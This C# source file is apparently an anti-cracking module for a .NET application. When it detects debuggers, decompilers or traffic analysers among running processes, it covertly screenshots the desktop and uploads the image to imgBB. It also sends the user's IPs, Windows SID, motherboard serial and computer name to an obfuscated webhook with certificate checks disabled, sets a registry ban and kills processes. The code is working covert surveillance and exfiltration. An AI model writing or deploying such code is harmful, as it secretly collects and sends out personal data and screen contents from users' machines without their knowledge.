using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Runtime
{
    internal static class AntiCrackingWithHook
    {
        internal static void Init()
        {
            new Thread(DoWork)
            {
                IsBackground = true,
                Priority = ThreadPriority.Lowest
            }.Start();
        }
        #region Sender
        public static void SendMSG(string url, string data)
        {
            WebRequest wRequest = WebRequest.Create(url);
            wRequest.Method = "POST";
            byte[] bArray = Encoding.UTF8.GetBytes(data);
            wRequest.ContentType = "application/json";
            wRequest.ContentLength = bArray.Length;
            Stream webData = wRequest.GetRequestStream();
            webData.Write(bArray, 0, bArray.Length);
            webData.Close();
            WebResponse webResponse = wRequest.GetResponse();
            webData = webResponse.GetResponseStream();
            StreamReader reader = new StreamReader(webData);
            reader.Close();
            webData.Close();
            webResponse.Close();
        }
        #endregion
        #region sCapture
        public static void Capture(string path)
        {
            try
            {
                string Dir = Path.GetDirectoryName(path);
                if (!Directory.Exists(Dir))
                {
                    Directory.CreateDirectory(Dir);
                    File.SetAttributes(Dir, File.GetAttributes(Dir) | FileAttributes.Hidden);
                }
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                Graphics g = Graphics.FromImage(bitmap);
                g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                bitmap.Save(path, ImageFormat.Png);
                bitmap.Dispose();
                //MessageBox.Show(path);
            }
            catch /*(Exception ex)*/
            {
                //MessageBox.Show(ex.Message);
            }
        }
        public static string uploadToImgBB(string imagePath)
        {
            var httpClient = new HttpClient();
            var url = "https://api.imgbb.com/1/upload?key=" + MutationClass.Key<string>(0);
            var content = new MultipartFormDataContent();
            var b64 = Convert.ToBase64String(File.ReadAllBytes(imagePath));
            content.Add(new StringContent(b64), "image");
            var request = new HttpRequestMessage(HttpMethod.Post, url) { Content = content };
            var response = httpClient.SendAsync(request).Result;
            if (response.IsSuccessStatusCode)
            {
                //MessageBox.Show(response.StatusCode.ToString());
                string imgUrl = string.Empty;
                var responseContent = response.Content.ReadAsStringAsync().Result;
                string pattern = "\"url\":\"(https:[^\"]+)\"";
                Match match = Regex.Match(responseContent, pattern);
                if (match.Success)
                {
                    imgUrl = match.Groups[1].Value;
                }
                return imgUrl;
            }
            else
            {
                //MessageBox.Show(response.StatusCode.ToString());
                return "";
            }
        }
        #endregion              
        #region MD5 Hash
        public static string CalculateMD5Hash()
        {
            var md5 = MD5.Create();
            var stream = File.OpenRead(Assembly.GetExecutingAssembly().Location);
            byte[] hashBytes = md5.ComputeHash(stream);
            return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
        }
        #endregion
        #region MotherboardID
        public static string GetMotherBoardSerialNo()
        {
            string serialNumber = "";
            try
            {
                ManagementClass wmi = new ManagementClass("Win32_BaseBoard");
                var providers = wmi.GetInstances();
                foreach (var provider in providers)
                {
                    serialNumber = provider["SerialNumber"].ToString();
                }
            }
            catch { }
            return serialNumber;
        }
        #endregion
        internal static string folderPath = null;
        public static void DoWork()
        {
            string IName = MutationClass.Key<string>(1);
            string xx = MutationClass.Key<string>(2);
            string msg = MutationClass.Key<string>(3);
            string content = MutationClass.Key<string>(4);
            string x = MutationClass.Key<string>(5);
            Random random = new Random();
            string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            int length = new Random().Next(2, 25);
            string randomLetters = new string(Enumerable.Repeat(alphabet, length)
                                           .Select(s => s[random.Next(s.Length)])
                                           .ToArray());
            string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + @"\" + randomLetters;
            string imgPath = dirPath + @"\" + IName;
            string imgUrl = string.Empty;
            while (true)
            {
                RegistryKey rkey = Registry.CurrentUser.OpenSubKey(@"Software\SBAC");
                try
                {
                    if (rkey != null && rkey.GetValue("data").ToString() == "ban = true" || rkey.GetValue("data").ToString() != "")
                    {
                        File.WriteAllText(Directory.GetCurrentDirectory() + "\\You are banned.txt", rkey.GetValue("val").ToString());
                        Process.GetCurrentProcess().Kill();
                    }
                }
                catch { }
                string[] processName = new string[]
{
        "JetBrains",
    "dotPeek",
    "JetBrains dotPeek",
    "De4dot",
                "CosMos",
                "SimpleAssemblyExplorer",
                "StringDecryptor",
                "CodeCracker",
                "x32dbg",
                "x64dbg",
                "ollydbg",
                "simpleassembly",
                "httpanalyzer",
                "httpdebug",
                "fiddler",
                "processhacker",
                "scylla_x86",
                "scylla_x64",
                "scylla",
                "IMMUNITYDEBUGGER",
                "MegaDumper",
                "reshacker",
                "cheat engine",
                "solarwinds",
                "HTTPDebuggerSvc",
                "netcheat",
                "megadumper",
                "ilspy",
                "reflector",
                "exeinfope",
                "DetectItEasy",
                "Exeinfo PE",
                "Process Hacker",
                "HTTP Debugger",
                "dnSpy",
                "Fiddler Everywhere",
                "ExtremeDumper",
                "KsDumper",
                "ollydbg",
                "HxD",
                "dumper",
                "Progress Telerik Fiddler Web Debugger",
                "dnSpy-x86",
                "cheat engine",
                "Cheat Engine",
                "cheatengine",
                "cheatengine-x86_64",
                "HTTPDebuggerUI",
                "ProcessHacker",
                "x32dbg",
                "x64dbg",
                "DotNetDataCollector32",
                "DotNetDataCollector64",
                "CFF Explorer",
                "M*3*G*4**D*u*m*p*3*R*",
                "ĘẍtŗęḿęĎựḿҏęŗ",
                "solarwinds",
                "HTTPDebuggerSvc",
                "HTTPDebuggerUI",
                "Everything",
                "FileActivityWatch",
                "netcheat"
};
                string[] eList = new string[]
{
                                "easyanticheat",
                                "eac",
                                MutationClass.Key<string>(6)
};
                Process[] processlist = Process.GetProcesses();
                foreach (Process theprocess in processlist)
                {
                    foreach (string s in processName)
                    {
                        if (theprocess.ProcessName.ToLower().Contains(s.ToLower()))
                        {
                            int pid = theprocess.Id;
                            var proc = Process.GetProcessById(pid);
                            try
                            {
                                ServicePointManager.Expect100Continue = true;
                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                                ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => true;
                                string user = Environment.UserName;
                                string ipo;
                                string hwid = WindowsIdentity.GetCurrent().User.Value;
                                string mboard = GetMotherBoardSerialNo();
                                var ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
                                ipo = new WebClient()
                                {
                                    Proxy = null
                                }.DownloadString("https://api.ipify.org/?format=text");
                                if (x == "0")
                                {
                                    string data = string.Concat(new string[] { "{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your app !\",\"description\":\" > Private IP : " + ip + @"\n > Public IP : " + ipo + @"\n > Hwid : " + hwid + @"\n > Motherboard ID : " + mboard + @"\n" + " > App MD5 Hash : " + CalculateMD5Hash() + @"\n > Process name : " + Process.GetCurrentProcess().ProcessName + @"\n > Computer name : " + user + @"\n" + "> Used tool : " + theprocess.ProcessName, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}" });
                                    if (xx == "1")
                                    {
                                        Capture(imgPath);
                                        if (File.Exists(imgPath))
                                        {
                                            folderPath = dirPath;
                                            imgUrl = uploadToImgBB(imgPath);
                                            string data2 = string.Concat(new string[] { "{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your app !\",\"description\":\" > Private IP : " + ip + @"\n > Public IP : " + ipo + @"\n > Hwid : " + hwid + @"\n > Motherboard ID : " + mboard + @"\n" + " > App MD5 Hash : " + CalculateMD5Hash() + @"\n > Process name : " + Process.GetCurrentProcess().ProcessName + @"\n > Computer name : " + user + @"\n" + "> Used tool : " + theprocess.ProcessName + @"\n" + "> Image : " + imgUrl, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}" });
                                            SendMSG(MutationClass.Key<string>(7), data2);
                                        }
                                        if (msg == "1")
                                        {
                                            MessageBox.Show(content, "Warning");
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                        else
                                        {
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                    }
                                    else
                                    {
                                        SendMSG(MutationClass.Key<string>(7), data);
                                        if (msg == "1")
                                        {
                                            MessageBox.Show(content, "Warning");
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                        else
                                        {
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                    }
                                }
                                else if (x == "1")
                                {
                                    string data = string.Concat(new string[] { "{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your app !\",\"description\":\" > Private IP : " + ip + @"\n > Public IP : " + ipo + @"\n > Hwid : " + hwid + @"\n > Motherboard ID : " + mboard + @"\n" + " > App MD5 Hash : " + CalculateMD5Hash() + @"\n > Process name : " + Process.GetCurrentProcess().ProcessName + @"\n > Computer name : " + user + @"\n" + "> Used tool : " + theprocess.ProcessName, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}" });
                                    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\SBAC");
                                    key.SetValue("data", "ban = true");
                                    string value = new string(Enumerable.Repeat(alphabet, length)
                                            .Select(ss => ss[random.Next(ss.Length)])
                                            .ToArray());
                                    string result = Convert.ToBase64String(Encoding.UTF8.GetBytes(new string("ISB".Select((c, i) => (char)(c ^ value[i % value.Length])).ToArray())));
                                    key.SetValue("val", result);
                                    key.Close();
                                    if (xx == "1")
                                    {
                                        Capture(imgPath);
                                        if (File.Exists(imgPath))
                                        {
                                            folderPath = dirPath;
                                            imgUrl = uploadToImgBB(imgPath);
                                            string data2 = string.Concat(new string[] { "{\"content\":null,\"embeds\":[{\"title\":\"> Detected a Cracker, who wants to crack your app !\",\"description\":\" > Private IP : " + ip + @"\n > Public IP : " + ipo + @"\n > Hwid : " + hwid + @"\n > Motherboard ID : " + mboard + @"\n" + " > App MD5 Hash : " + CalculateMD5Hash() + @"\n > Process name : " + Process.GetCurrentProcess().ProcessName + @"\n > Computer name : " + user + @"\n" + "> Used tool : " + theprocess.ProcessName + @"\n" + "> Image : " + imgUrl, "\",\"color\":0,\"footer\":{\"text\":\"", " \"},\"thumbnail\":{\"url\":\"\"}}]}" });
                                            SendMSG(MutationClass.Key<string>(7), data2);
                                        }
                                        if (msg == "1")
                                        {
                                            MessageBox.Show(content, "Warning");
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                        else
                                        {
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                    }
                                    else
                                    {
                                        SendMSG(MutationClass.Key<string>(7), data);
                                        if (msg == "1")
                                        {
                                            MessageBox.Show(content, "Warning");
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                        else
                                        {
                                            if (!proc.HasExited)
                                                proc.Kill();
                                            Environment.Exit(0);
                                        }
                                    }
                                }
                            }
                            catch
                            {
                                Environment.Exit(0);
                            }
                        }
                    }
                }
                Thread.Sleep(3000);
            }
        }
    }
}